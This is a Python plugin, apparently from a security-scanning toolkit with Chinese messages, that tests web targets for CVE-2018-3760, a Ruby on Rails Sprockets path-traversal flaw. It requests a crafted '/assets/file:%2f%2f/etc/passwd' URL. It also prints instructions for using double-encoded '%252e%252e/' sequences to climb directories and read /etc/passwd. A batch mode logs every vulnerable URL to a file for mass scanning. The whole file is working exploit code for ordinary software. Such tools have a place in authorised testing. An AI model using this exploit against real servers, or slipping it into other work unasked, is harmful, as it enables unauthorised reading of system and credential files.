#!/user/bin/env python3
# -*- coding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet

urllib3.disable_warnings()


class Cve_2018_3760:

    def run(self, urls):
        url = urls + '/assets/file:%2f%2f/etc/passwd'
        # print(head)
        try:
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=5, proxies=self.proxy)
            if "/etc/passwd is no" in response.text:
                if not self.batch:
                    OutPrintInfoSuc("Ruby", '存在Ruby任意文件读取')
                    OutPrintInfo("Ruby", '[b yellow]可获得允许的目录列表。随便选择其中一个目录，如/usr/src/blog/app/assets/images，然后使用%252e%252e/向上一层替换，最后读取/etc/passwd')
                    OutPrintInfo("Ruby", url)
                else:
                    OutPrintInfoSuc("Ruby", f'存在Ruby任意文件读取 {url}')
                    with open("./result/ruby_2018_3760.txt","a") as w:
                        w.write(f"{url}\n")
            else:
                if not self.batch:
                    OutPrintInfo("Ruby", '不存在Ruby任意文件读取')
        except Exception:
            if not self.batch:
                OutPrintInfo("Ruby", '目标请求出错')

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Ruby", '开始执行Ruby任意文件读取')
        self.run(url)
        if not self.batch:
            OutPrintInfo("Ruby", 'Ruby任意文件读取执行结束')